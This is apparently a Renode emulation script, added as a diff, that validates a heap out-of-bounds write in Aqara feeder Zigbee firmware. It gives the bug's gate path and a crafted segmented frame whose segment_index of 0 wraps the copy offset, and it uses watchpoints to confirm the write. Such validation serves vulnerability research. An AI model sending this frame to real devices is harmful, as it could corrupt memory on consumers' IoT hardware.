@@ -1,0 +1,59 @@
+:name: ZB-02 Aqara feeder sub_14D08 heap OOB write — emulation-based validation
+:description: Drives the 0xFCC0 MIoT segmented-reassembly handler sub_14D08 of the real Aqara feeder firmware on the emulated EFR32MG21 and demonstrates the attacker-controlled out-of-bounds write (segment_index=0 wraps the destination offset to +65476).
+#
+# RESULT: memcpy dest = *0x20004610 + (uint16)(60*(segment_index-1)).
+#   With alloc base pre-seeded to 0x20005000 and segment_index=0:
+#   offset = (uint16)(60*-1) = 0xFFC4 = 65476  =>  write lands at 0x20014FC4
+#   (65476 bytes above the buffer base) — proving unbounded attacker offset.
+#
+# Bug (sub_14D08 @0x14D08): reads segment_index = frame[2] with NO bound check,
+# computes dest = alloc_base + (uint16)(60*(idx-1)), memcpy of length-3 attacker
+# bytes at 0x14d8c (BL sub_3D856). No CMP of idx vs num_segments before the write.
+# Gate: sub_14EB4 (mfg cluster 0xFCC0, cmdId==2, msg_type 0xfff1) -> sub_14DEC
+#       -> sub_14D08(r0=frame, r1=len&0xff, r2=ctx) when frame[0]!=0.
+
+$bin=@scripts/silabs-vuln/zb02_aqara.elf
+include @scripts/silabs-vuln/boot_mg21.resc
+
+emulation RunFor "0.3"
+pause
+
+# --- Pre-seed the reassembly state so sub_14D08 skips the allocator and uses a
+#     known buffer base (function-level isolation of the write primitive) ---
+sysbus WriteDoubleWord 0x20004608 0x00000000
+sysbus WriteDoubleWord 0x2000460C 0x00000002
+sysbus WriteDoubleWord 0x20004610 0x20005000
+
+# --- Crafted MIoT segmented frame at 0x20005800 (len=19 -> memcpy 16 bytes) ---
+#   [0]=01 segmented flag  [1]=01 num_segments  [2]=00 segment_index(->wrap)
+#   [3..18] = 0x41 payload
+sysbus WriteDoubleWord 0x20005800 0x41000101
+sysbus WriteDoubleWord 0x20005804 0x41414141
+sysbus WriteDoubleWord 0x20005808 0x41414141
+sysbus WriteDoubleWord 0x2000580C 0x41414141
+sysbus WriteDoubleWord 0x20005810 0x00414141
+
+# --- Call frame contract: r0=frame, r1=len, r2=ctx, LR=sentinel, PC=sub_14D08 ---
+sysbus.cpu SetRegister 13 0x2000FF00
+sysbus.cpu SetRegister 14 0x20005901
+sysbus.cpu SetRegister 0  0x20005800
+sysbus.cpu SetRegister 1  0x00000013
+sysbus.cpu SetRegister 2  0x00000000
+sysbus.cpu PC 0x14D08
+
+echo ">>> BEFORE: OOB target 0x20014FC4 ="
+sysbus ReadDoubleWord 0x20014FC4
+
+# Watchpoint at the computed OOB destination (base 0x20005000 + 0xFFC4).
+sysbus AddWatchpointHook 0x20014FC4 DoubleWord Write "self.NoisyLog('>>> WATCHPOINT HIT: attacker-controlled OOB write at 0x20014FC4 (65476 bytes above buffer base) value=0x{0:X}'.format(value))"
+
+# Halt exactly when the memcpy (0x14d8c BL sub_3D856) returns to 0x14d90 — the OOB
+# write is complete at that point. A cold hook that sets IsHalted stops the run
+# deterministically. (Do NOT free-run/Step past here: sub_14D08's post-memcpy
+# completeness-check path enters a slow/looping region that stalls single-step —
+# the memory-safety violation has already occurred by 0x14d90.)
+cpu AddHook 0x14d90 "self.ErrorLog('>>> POST-MEMCPY: OOB write done, halting'); self.IsHalted = True"
+emulation RunFor "0.05"
+
+echo ">>> AFTER: OOB target 0x20014FC4 (expect 0x41414141) ="
+sysbus ReadDoubleWord 0x20014FC4
